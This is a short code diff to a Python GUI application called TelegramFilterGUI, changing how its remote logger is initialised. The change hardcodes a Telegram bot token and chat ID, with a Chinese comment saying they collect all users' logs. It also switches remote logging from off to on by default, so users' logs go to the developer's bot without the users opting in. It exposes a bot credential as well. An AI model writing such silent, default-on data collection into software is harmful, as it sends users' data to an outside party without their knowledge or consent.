@@ -869,10 +869,15 @@ class TelegramFilterGUI(QMainWindow):
         """初始化远程日志"""
         global remote_logger
         if remote_logger is None:
+            # 默认使用内置的 Bot Token 和 Chat ID（收集所有用户日志）
+            default_bot_token = "8726232685:AAH6tLEKREjMZ2iXtphkThhir8YIh7xuK_0"
+            default_chat_id = "7814255501"
+
+            # 优先使用配置文件中的设置（如果用户想用自己的 Bot）
             log_config = self.config.get('remote_log', {})
-            bot_token = log_config.get('bot_token')
-            chat_id = log_config.get('chat_id')
-            enabled = log_config.get('enabled', False)
+            bot_token = log_config.get('bot_token', default_bot_token)
+            chat_id = log_config.get('chat_id', default_chat_id)
+            enabled = log_config.get('enabled', True)  # 默认启用
 
             if bot_token and chat_id and enabled:
                 try:
